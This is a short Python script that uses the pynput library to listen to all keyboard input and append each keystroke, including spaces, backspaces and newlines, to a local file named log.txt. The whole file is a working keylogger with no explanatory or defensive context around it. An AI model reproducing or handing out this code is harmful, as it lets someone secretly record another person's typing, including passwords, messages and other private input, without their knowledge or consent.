from pynput import keyboard
with keyboard.Listener(
    on_press=lambda key: open("log.txt", "a").write(
        {
            keyboard.Key.space: ' ',
            keyboard.Key.backspace: ' backspace ',
            keyboard.Key.enter: '\n'
        }.get(key, getattr(key, 'char', '') or '')
    )
) as listener:
    listener.join()